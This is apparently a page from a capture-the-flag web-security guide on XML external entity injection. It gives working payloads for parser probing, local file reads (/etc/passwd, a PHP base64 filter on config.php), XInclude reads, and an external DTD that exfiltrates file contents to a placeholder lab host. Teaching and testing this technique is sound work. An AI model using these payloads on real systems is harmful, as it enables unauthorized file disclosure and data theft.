---
title: "XXE & XML Parsers"
weight: 63
bookToc: true
---

# XML external entity injection

**Prove XML processing, then entity expansion, then external resource access.** Each step establishes a different capability.

## 1. Establish the parsing surface

Look for XML API bodies, SOAP, SVG, document imports and server-side XML conversions. Keep the application's real root and field names; changing the entire document may fail schema validation before reaching the interesting parser.

```xml
<?xml version="1.0"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Use the original accepted `Content-Type`, normally `application/xml` or `text/xml`. A JSON route may reject XML completely. Conversion support must be demonstrated, not assumed.

## 2. Internal entity probe

```xml
<?xml version="1.0"?>
<!DOCTYPE stockCheck [
  <!ENTITY marker "CTF_XML_71">
]>
<stockCheck><productId>&marker;</productId><storeId>1</storeId></stockCheck>
```

Control: change the entity value to `CTF_XML_82`. Expanded markers in a field-validation error establish internal entity processing. An unchanged `&marker;`, escaped output or a generic error does not.

Internal entities working **does not prove external entities are enabled**.

## 3. Local file entity

```xml
<?xml version="1.0"?>
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

Compare `file:///etc/ctf-does-not-exist`. Recognizable file bytes vs a read failure are evidence. Then read known application source or the actual challenge path using the same primitive.

Potential complications: numeric conversion before reflection, newlines in the response, illegal XML characters inside the target file, restricted file permissions, or a parser configured to load no external resources.

For a confirmed PHP stream-capable XML loader, a Base64 filter can encode difficult file bytes:

```xml
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">
```

This is PHP-specific; Java and Python XML parsers do not implement PHP wrappers.

## 4. Blind external entity callback

```xml
<?xml version="1.0"?>
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://YOUR-LAB-HOST/xxe-general-71">
]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

If general entity processing is blocked but external parameter entities are allowed, test a unique marker:

```xml
<?xml version="1.0"?>
<!DOCTYPE stockCheck [
  <!ENTITY % remote SYSTEM "http://YOUR-LAB-HOST/xxe-parameter-71">
  %remote;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Serve valid DTD content, such as an empty response, if the callback is fetched. Compare a normal XML control and fresh callback IDs. A callback establishes resource resolution; it does not automatically disclose file contents. See [blind XXE prerequisites](https://portswigger.net/web-security/xxe/blind).

## 5. External DTD file extraction in a matching lab

If the challenge permits serving your own DTD, the submitted document can load it:

```xml
<?xml version="1.0"?>
<!DOCTYPE stockCheck [
  <!ENTITY % remote SYSTEM "http://YOUR-LAB-HOST/extract.dtd">
  %remote;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Contents of `extract.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://YOUR-LAB-HOST/collect?data=%file;'>">
%eval;
%send;
```

This depends on external DTD/parameter entity expansion and outbound HTTP. Raw file bytes must fit a URI: spaces, newlines, `&`, `#` and binary data commonly break this approach. It is not an arbitrary-file universal extractor. Base64 needs a supported encoding primitive; XML entity expansion does not URL-encode data for you.

## 6. XInclude: cannot control a DOCTYPE

An application may place your XML fragment inside a larger document and run XInclude processing:

```xml
<probe xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</probe>
```

Use the exact field accepting an XML fragment. Merely parsing XML does not necessarily invoke XInclude; this is a separate processor feature. A missing-file control helps distinguish processing from plain reflection.

## 7. SVG and document uploads

SVG is XML, but the server must parse it for a server-side XXE. A browser rendering an SVG is a different surface. Office-style containers may hold XML documents; editing XML inside an archive helps only if the server processes that XML with vulnerable options.

## Troubleshooting

| Result | Next action |
| --- | --- |
| `DOCTYPE is disallowed` | This parser blocks the direct route; inspect another processing stage |
| Internal marker expands, external file does not | External entity setting, protocol restriction or permissions |
| Numeric validation error | Read error body; it may contain expanded text |
| Callback never occurs | Check reachability with the provided facility and whether external resolution is enabled |
| Empty response | Look for generated report, asynchronous import status or saved parser error |

Related: [SSRF](../ssrf/), [upload processing](../file-upload/).

Reference: [PortSwigger XXE overview and parser surfaces](https://portswigger.net/web-security/xxe).
